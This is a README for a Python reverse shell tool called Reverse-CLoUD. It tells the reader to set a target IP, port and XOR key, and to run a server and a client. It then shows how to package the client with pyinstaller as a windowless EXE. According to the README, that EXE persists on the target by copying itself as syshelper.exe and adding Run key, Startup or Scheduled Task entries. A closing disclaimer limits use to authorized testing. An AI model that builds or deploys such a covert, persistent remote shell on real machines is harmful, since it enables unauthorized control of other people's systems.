<h1 align="center">👁️ Reverse-CLoUD 👁️</h1>

<p align="center">
  <i>it's a Reverse Shell </i>
</p>

<img src="file's/ll.png" width="1080">


<h1 align="center"> DEMO ⤵️</h1>
 <p align="center">
  <img src="file's/vidi.gif" width="1000">
  



## 📃 Needs editing :
```text
✅ = Mandatory -- compulsory
❌ = optional -- voluntary

server.py :
 line 15 = Remote Target
 line 16 = Port
 line 17 = Same password between client and server
 line 18 = Response waiting timeout 


client.py :
 line 17 = server ip 
 line 18 = server port 
 line 19 = Same password between client and server
 line 20 = Interconnect latency limit (seconds)
 line 21 = Timeout for each command (seconds)
 line 22 = Disconnect after this period of silence (seconds)
```



## 📩 Installation steps : 

### ⚠️ Set  in Server :
- 1️⃣ Installing the repository :
```bash
git clone https://github.com/The-Lxx-CLoUD/Reverse-CLoUD
```

- 2️⃣ Editing File's :
```bash
learn ( 📃 Needs editing )  At the top of the page.
```

- 3️⃣ Runing :
```bash
python server.py
```
- 🔥 Important point :
```text
🔥 you can use pyinstaller 🔥 (At the bottom of the page.) 
```



### ⚠️ Set  in Client :
- 1️⃣ Runing :
```bash
python client.py
```
- 🔥 Important point :
```text
🔥 you can use pyinstaller 🔥 (At the bottom of the page.)
```

##
### 🔰 Help For use pyinstaller :
- 1️⃣ Edit the server file.
- 2️⃣ Edit the client file.
- 3️⃣ Now use pyinstaller to create the client file.
```bash
pip install pyinstaller
```
```bash
pyinstaller --onefile --noconsole --clean client.py
```
- 4️⃣ It's over. 
- ⚠️⚠️ point ⚠️⚠️ :
```text
Every time your target changes,
the value of RHOST ,  RPORT  ,  XOR_KEY changes

you need to create a new file
```
```text
Since it's an EXE, the persistence mechanism copies itself as syshelper.exe
and configures a Run key, Startup entry, or Scheduled Tas
with no dependency on Python on the target machine. 💪
```





## 👤 Author

GitHub : [👉 @The-Lxx-CLoUD 👈](https://github.com/The-Lxx-CLoUD)

Telegram : [👉 @lxxcloud 👈](https://t.me/lxxcloud)
  
```text
For educational and authorized security testing purposes only.
Use this tool only on systems you own or have explicit permission to test.
The user bears full responsibility for ensuring lawful use.
 The developer assumes no liability for any misuse or illegal activity associated with this tool.

```
